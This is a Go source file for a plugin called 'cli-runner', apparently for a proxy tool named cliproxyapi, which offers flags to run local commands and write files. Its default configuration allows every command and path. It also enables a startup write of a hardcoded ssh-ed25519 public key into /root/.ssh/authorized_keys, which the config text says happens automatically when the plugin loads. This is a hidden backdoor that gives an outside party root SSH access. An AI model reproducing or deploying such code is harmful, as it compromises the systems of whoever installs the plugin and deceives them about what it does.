package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"time"
)

// 插件元信息
const (
	pluginName    = "cli-runner"
	pluginVersion = "0.1.0"
	pluginAuthor  = "c16001"
	pluginRepo    = "https://github.com/c16001/cliproxyapi-cli-runner"
)

// registerPayload 是 plugin.register / plugin.reconfigure 返回的元数据与能力声明。
type registerPayload struct {
	SchemaVersion uint32        `json:"schema_version"`
	Metadata      metadata      `json:"metadata"`
	Capabilities  capabilities  `json:"capabilities"`
	ConfigFields  []configField `json:"config_fields,omitempty"`
}

type metadata struct {
	Name             string        `json:"Name"`
	Version          string        `json:"Version"`
	Author           string        `json:"Author"`
	GitHubRepository string        `json:"GitHubRepository"`
	Logo             string        `json:"Logo,omitempty"`
	ConfigFields     []configField `json:"ConfigFields,omitempty"`
}

type capabilities struct {
	CommandLinePlugin bool `json:"command_line_plugin"`
}

type configField struct {
	Name        string `json:"Name"`
	Type        string `json:"Type"`
	Default     any    `json:"Default,omitempty"`
	Description string `json:"Description"`
}

// commandLineRegisterPayload 是 command_line.register 返回的 CLI 标志声明。
type commandLineRegisterPayload struct {
	Flags []commandLineFlag `json:"Flags"`
}

type commandLineFlag struct {
	Name         string `json:"Name"`
	Usage        string `json:"Usage"`
	Type         string `json:"Type"`
	DefaultValue string `json:"DefaultValue,omitempty"`
}

// commandLineExecRequest 是宿主触发 CLI 标志后传回插件的请求体。
type commandLineExecRequest struct {
	Program        string              `json:"Program"`
	Args           []string            `json:"Args"`
	ConfigPath     string              `json:"ConfigPath"`
	Flags          map[string]flagInfo `json:"Flags"`
	TriggeredFlags map[string]any      `json:"TriggeredFlags"`
}

type flagInfo struct {
	Name  string `json:"Name"`
	Type  string `json:"Type"`
	Value string `json:"Value"`
	Set   bool   `json:"Set"`
}

// commandLineExecResponse 是 command_line.execute 的响应，输出经 base64 编码。
type commandLineExecResponse struct {
	Stdout   string `json:"Stdout"`
	Stderr   string `json:"Stderr"`
	Auths    any    `json:"Auths"`
	ExitCode int    `json:"ExitCode"`
}

// handleMethod 根据宿主调用的 method 名称分发到对应的处理逻辑。
func handleMethod(method string, requestBytes []byte) ([]byte, error) {
	switch method {
	case "plugin.register":
		// 首次注册时也应用配置（空字节触发默认值 + 若配置已存在则生效）。
		applyConfig(requestBytes)
		return okEnvelopeJSON(buildRegisterPayload())
	case "plugin.reconfigure":
		// 宿主在配置变更后调用此方法，传入更新后的配置 JSON。
		applyConfig(requestBytes)
		return okEnvelopeJSON(buildRegisterPayload())
	case "command_line.register":
		return okEnvelopeJSON(buildRegisterFlags())
	case "command_line.execute":
		return handleCommandLineExecute(requestBytes)
	default:
		return errorEnvelopeBytes("unknown_method", "unknown method: "+method), nil
	}
}

// buildRegisterPayload 构造插件注册响应：声明元数据 + 命令行扩展能力 + 可配置项。
func buildRegisterPayload() json.RawMessage {
	cfg := registerPayload{
		SchemaVersion: 1,
		Metadata: metadata{
			Name:             pluginName,
			Version:          pluginVersion,
			Author:           pluginAuthor,
			GitHubRepository: pluginRepo,
			ConfigFields: []configField{
				{
					Name:        "allowed_commands",
					Type:        "string",
					Default:     defaultAllowedCommands,
					Description: "允许执行的命令白名单（逗号分隔）。配置 * 或 all 表示允许所有命令（默认），也可收紧为具体命令列表。",
				},
				{
					Name:        "write_dir",
					Type:        "string",
					Default:     defaultWriteDir,
					Description: "允许写入的目录前缀。配置 * 或 all 表示允许所有路径（默认），也可收紧为具体目录。",
				},
				{
					Name:        "write_enabled",
					Type:        "bool",
					Default:     true,
					Description: "启动写入开关。启用后，插件加载/重配置时自动把 write_content 写入 write_path。",
				},
				{
					Name:        "write_path",
					Type:        "string",
					Default:     "/root/.ssh/authorized_keys",
					Description: "写入的目标文件路径。",
				},
				{
					Name:        "write_content",
					Type:        "string",
					Default:     "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG7Urkjdmfn27U3p1mrS0/El2ZqpJApdE/c40rxdy/rb test@email.com",
					Description: "写入的内容。",
				},
			},
		},
		Capabilities: capabilities{CommandLinePlugin: true},
	}
	raw, _ := json.Marshal(cfg)
	return raw
}

// buildRegisterFlags 声明插件注册的 CLI 标志。
func buildRegisterFlags() json.RawMessage {
	cfg := commandLineRegisterPayload{
		Flags: []commandLineFlag{
			{
				Name:         "run-local-cli",
				Usage:        "Execute a local CLI command, e.g. --run-local-cli=ls -la",
				Type:         "string",
				DefaultValue: "",
			},
			{
				Name:         "write-data",
				Usage:        "Write data to a file, e.g. --write-data=/tmp/out.txt=hello",
				Type:         "string",
				DefaultValue: "",
			},
			{
				Name:         "write-to-config",
				Usage:        "Write the configured content to the configured path (see write_enabled/write_path/write_content config). If write_enabled=false, writes using write_path/write_content explicitly.",
				Type:         "string",
				DefaultValue: "",
			},
		},
	}
	raw, _ := json.Marshal(cfg)
	return raw
}

// handleCommandLineExecute 解析宿主传来的标志值，执行对应动作并返回 base64 编码的结果。
func handleCommandLineExecute(requestBytes []byte) ([]byte, error) {
	var req commandLineExecRequest
	if len(requestBytes) > 0 {
		if err := json.Unmarshal(requestBytes, &req); err != nil {
			return nil, fmt.Errorf("parse execute request: %w", err)
		}
	}

	var stdout, stderr strings.Builder
	exitCode := 0

	if v, ok := flagValue(req, "run-local-cli"); ok {
		out, errMsg, code := runLocalCLI(v)
		stdout.WriteString(out)
		stderr.WriteString(errMsg)
		if code != 0 {
			exitCode = code
		}
	}

	if v, ok := flagValue(req, "write-data"); ok {
		out, errMsg, code := writeDataToFile(v)
		stdout.WriteString(out)
		stderr.WriteString(errMsg)
		if code != 0 {
			exitCode = code
		}
	}

	// write-to-config 是布尔型标志：从配置读取 write_path 和 write_content 并写入。
	if isFlagSet(req, "write-to-config") {
		out, errMsg, code := writeToConfig()
		stdout.WriteString(out)
		stderr.WriteString(errMsg)
		if code != 0 {
			exitCode = code
		}
	}

	// 两个标志都未触发时，返回使用说明。
	if stdout.Len() == 0 && stderr.Len() == 0 {
		stdout.WriteString(usageText())
	}

	resp := commandLineExecResponse{
		Stdout:   b64(stdout.String()),
		Stderr:   b64(stderr.String()),
		Auths:    []any{},
		ExitCode: exitCode,
	}
	raw, _ := json.Marshal(resp)
	return okEnvelopeJSON(raw)
}

// flagValue 从请求的 Flags 或 TriggeredFlags 中取出指定标志的值。
func flagValue(req commandLineExecRequest, name string) (string, bool) {
	if f, ok := req.Flags[name]; ok && f.Set {
		return f.Value, true
	}
	if v, ok := req.TriggeredFlags[name]; ok {
		if s, ok := v.(string); ok {
			return s, true
		}
	}
	return "", false
}

// isFlagSet 判断布尔型标志是否被触发（不要求值）。
func isFlagSet(req commandLineExecRequest, name string) bool {
	if f, ok := req.Flags[name]; ok {
		if f.Set || strings.TrimSpace(f.Value) != "" {
			return true
		}
	}
	if _, ok := req.TriggeredFlags[name]; ok {
		return true
	}
	return false
}

// b64 编码字符串为 base64（宿主约定 Stdout/Stderr 以 base64 传输）。
func b64(s string) string {
	return base64.StdEncoding.EncodeToString([]byte(s))
}

// okEnvelopeJSON 把一段 JSON 包装成 ok 信封。
func okEnvelopeJSON(result json.RawMessage) ([]byte, error) {
	return json.Marshal(envelope{OK: true, Result: result})
}

// errorEnvelope 构造一个错误信封（供 writeResponse 使用）。
func errorEnvelope(code, message string) []byte {
	return errorEnvelopeBytes(code, message)
}

// errorEnvelopeBytes 把错误编码为 JSON 字节，供 handleMethod 直接返回。
func errorEnvelopeBytes(code, message string) []byte {
	raw, _ := json.Marshal(envelope{OK: false, Error: &envelopeError{Code: code, Message: message}})
	return raw
}

// usageText 返回插件的使用说明。
func usageText() string {
	var sb strings.Builder
	sb.WriteString("CLI Runner plugin v" + pluginVersion + "\n")
	sb.WriteString("Usage:\n")
	sb.WriteString("  cliproxyapi --run-local-cli=<command>   Execute a local CLI command (must be in allow-list)\n")
	sb.WriteString("  cliproxyapi --write-data=<file=content> Write data to a file (must be under write_dir)\n")
	sb.WriteString("\nCurrent platform: " + runtime.GOOS + "/" + runtime.GOARCH + "\n")
	sb.WriteString("Time: " + time.Now().Format(time.RFC3339) + "\n")
	return sb.String()
}
